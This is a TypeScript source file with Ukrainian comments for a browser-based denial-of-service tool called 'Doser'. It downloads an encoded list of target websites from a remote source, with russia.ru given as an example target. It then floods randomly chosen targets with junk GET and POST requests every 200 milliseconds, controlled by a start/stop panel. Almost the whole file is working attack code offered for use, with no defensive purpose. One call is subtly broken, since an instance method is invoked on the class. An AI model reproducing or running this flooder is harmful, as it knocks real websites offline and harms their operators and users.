/*!
MIT License

Copyright (c) 2022-2023 Yuriy Bogdan
*/

// @ts-nocheck

/**
 * Інструменти для досера ({@link Doser})
 *
 * - getFlood
 * - getTargets
 */
const Tools = {
	charSet: 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890',

	/**
	 * Отримати флуд
	 *
	 * @example Tools.getFlood(12) // 'YOt4umytz56I'
	 *
	 * @param {number} lenght Об'єм флуду (в кількості символів)
	 * @returns {string} Флуд
	 */
	getFlood(lenght: number): string {
		let flood = '';

		for (let i = 0; i < lenght; i++) {
			flood += randomChoice(this.charSet);
		}
		return flood;
	},
	/**
	 * Отримання цілей для атаки
	 *
	 * Беруться цілі, для яких в нас є **потрібний метод** для атаки
	 *
	 * @example
	 * await Tools.getTargets()
	 * [
	 *   {
	 *     "page": "https://russia.ru",
	 *     "method": "get"
	 *   },
	 *   ...
	 * ]
	 *
	 * @param {string[]} supportedMethods - Методи, якими ми можемо атакувати
	 * @returns {Promise<Target[]>} **Відфільтровані цілі** (вилучаються цілі, для яких треба _специфічні_ методи атаки)
	 */
	async getTargets(supportedMethods: string[]): Promise<Target[]> {
		return new Promise(
			async (resolve, reject) =>
				await fetch(targetSource, {
					cache: 'no-cache',
				})
					.then(async (response) => {
						if (response) {
							const responseText = await response.text();
							/** @type {Target[]} */
							let encodedData;
							try {
								encodedData = JSON.parse(atob(responseText));
							} catch (e) {
								reject(new TargetsEncodingError());
							}

							if (encodedData.length != 0) {
								/** @type {Target[]} */
								let filteredTargets = [];

								for (let target of encodedData) {
									supportedMethods.includes(target.method) &&
										filteredTargets.push(target);
								}

								resolve(filteredTargets);
							} else {
								reject(new EmptyTargetsList());
							}
						}
					})
					.catch(() => {
						reject(new TargetsFetchingError());
					})
		);
	},
};

class Sword {
	private defaultRequestParams = {
		cache: 'no-cache',
		referrerPolicy: 'no-referrer',
		mode: 'no-cors',
	};

	async attack(target: Target) {
		return await this[target.method](target);
	}

	private async request(url: string, data: any) {
		return await fetch(url, {
			...this.defaultRequestParams,
			...data,
		});
	}

	async get(target: Target) {
		let page = target.page;

		if (!page.includes('?')) {
			page += '/' + Tools.getFlood(64);
		}

		return await this.request(page, {
			method: 'GET',
		});
	}

	async post(target: Target) {
		return await this.request(target.page, {
			method: 'POST',
			body: Tools.getFlood(128),
		});
	}
}

class Doser {
	/** Статус атаки (чи йде зараз атака) */
	private attack: boolean;

	/** Інтервал між атаками (в _мілісекундах_) */
	private speed: number;

	/** Підтримувані методи, якими ми можемо атакувати */
	private supportedAttackMethods: string[];

	/** Цикл атаки */
	private attackCycle: number;

	constructor() {
		this.attack = false;
		this.speed = 200;
		this.supportedAttackMethods = ['post', 'get'];
	}

	async run() {
		this.attack ? this.stop() : this.start();
	}

	async start() {
		if (!this.attack) {
			Panel.buttonText('Стоп');
			Sounds.click.play();
			this.attack = true;

			Panel.lockButton();
			await Tools.getTargets(this.supportedAttackMethods)
				.then(async (targets) => {
					// Атакоцикл, брум-брум! 😂
					this.attackCycle = setInterval(async () => {
						const randomTarget = randomChoice(targets);

						Panel.showCurrentTarget(randomTarget);

						Sword.attack(randomTarget);
						Panel.increaseAttacksCounter();
					}, this.speed);
					Panel.unlockButton();
				})
				.catch((err: Error) => {
					console.log(err);

					switch (err.name) {
						case 'TargetsFetchingError':
							Swal.fire(
								'Помилка',
								'Не вдалось завантажити цілі',
								'error'
							);
							break;

						case 'EmptyTargetsList':
							Swal.fire(
								'Повідомлення',
								'Список цілей порожній, можемо відпочивати)',
								'success'
							);
							break;

						case 'TargetsEncodingError':
							Swal.fire(
								'Помилка',
								'Не вдалось розшифрувати цілі, повідомте про це розробнику',
								'error'
							);
							break;
					}
					Panel.unlockButton();
					Panel.buttonText('Старт!');
					this.attack = false;
				});
		}
	}

	/** Зупинка атаки */
	stop() {
		clearInterval(this.attackCycle);
		this.attack = false;
		console.clear();
		Sounds.click.play();
		Panel.buttonText('Старт!');
	}
}
